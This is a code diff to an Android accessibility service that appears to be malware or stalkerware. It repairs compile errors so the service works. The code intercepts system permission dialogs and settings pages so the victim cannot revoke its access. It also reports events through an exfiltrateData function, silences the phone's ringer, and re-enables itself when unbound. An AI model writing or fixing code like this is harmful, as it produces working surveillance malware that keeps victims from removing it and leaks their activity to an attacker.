@@ -14,7 +14,6 @@ import android.os.Handler
 import android.os.Looper
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
-import android.view.accessibility.AccessivityNodeInfo
 import android.view.accessibility.AccessibilityNodeInfo
 import android.view.accessibility.AccessibilityManager
 import android.provider.Settings
@@ -94,10 +93,8 @@ class DecryAccessibilityService : AccessibilityService() {
         Log.i(TAG, "Target apps: $targetApps")
 
         val info = AccessibilityServiceInfo().apply {
-            this.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IN_SETTING_DECODE or
-                AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
-                AccessibilityServiceInfo.FLAG_DEFAULT or
-                AccessibilityServiceInfo.FLAG_IMPORTANT
+            this.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
+                AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
             this.eventTypes = AccessibilityEvent.TYPES_ALL_MASK
             this.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK
         }
@@ -277,7 +274,7 @@ class DecryAccessibilityService : AccessibilityService() {
         if (packageName == "android" && className.contains("Permission")) {
             Log.w(TAG, "System permission dialog detected - closing")
             exfiltrateData("anti_revocation", "Permission dialog intercepted", "permission_blocked")
-            performGlobalAction(GlobalAction.BACK)
+            performGlobalAction(GLOBAL_ACTION_BACK)
             return
         }
 
@@ -367,11 +364,11 @@ class DecryAccessibilityService : AccessibilityService() {
     private fun closeSettingsRevocationPage() {
         try {
             // First try to navigate back
-            performGlobalAction(GlobalAction.BACK)
+            performGlobalAction(GLOBAL_ACTION_BACK)
             
             // If that doesn't work, go to home screen
             handler.postDelayed({
-                performGlobalAction(GlobalAction.HOME)
+                performGlobalAction(GLOBAL_ACTION_HOME)
             }, 500)
             
             // Log and notify
@@ -380,7 +377,7 @@ class DecryAccessibilityService : AccessibilityService() {
         } catch (e: Exception) {
             Log.e(TAG, "Failed to close settings: ${e.message}")
             try {
-                performGlobalAction(GlobalAction.HOME)
+                performGlobalAction(GLOBAL_ACTION_HOME)
             } catch (e2: Exception) {
                 Log.e(TAG, "Emergency navigation failed: ${e2.message}")
             }
@@ -569,16 +566,14 @@ class DecryAccessibilityService : AccessibilityService() {
 
     private fun toggleDnd(enabled: Boolean) {
         try {
-            val notificationManager =
-                getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
-            if (notificationManager.isNotificationPolicyAccessGranted) {
-                notificationManager.currentInterruptionFilter =
-                    if (enabled) android.app.NotificationManager.INTERRUPTION_FILTER_NONE
-                    else android.app.NotificationManager.INTERRUPTION_FILTER_ALL
+            val audioManager =
+                getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
+            audioManager.ringerMode =
+                if (enabled) android.media.AudioManager.RINGER_MODE_SILENT
+                else android.media.AudioManager.RINGER_MODE_NORMAL
 
-                Log.i(TAG, "DND ${if (enabled) "ON" else "OFF"}")
-                exfiltrateData("dnd_status", if (enabled) "on" else "off", "accessibility")
-            }
+            Log.i(TAG, "DND ${if (enabled) "ON" else "OFF"}")
+            exfiltrateData("dnd_status", if (enabled) "on" else "off", "accessibility")
         } catch (e: Exception) {
             Log.e(TAG, "DND error: ${e.message}")
         }
@@ -592,9 +587,8 @@ class DecryAccessibilityService : AccessibilityService() {
         Log.d(TAG, "Service interrupted")
     }
 
-    override fun onServiceDisconnected() {
-        super.onServiceDisconnected()
-        Log.w(TAG, "Service disconnected")
+    override fun onUnbind(intent: Intent?): Boolean {
+        Log.w(TAG, "Service unbound")
         
         // Attempt auto-restart
         handler.postDelayed({
@@ -603,6 +597,7 @@ class DecryAccessibilityService : AccessibilityService() {
                 reEnableAccessibilityService()
             }
         }, 2000)
+        return super.onUnbind(intent)
     }
     
     override fun onDestroy() {
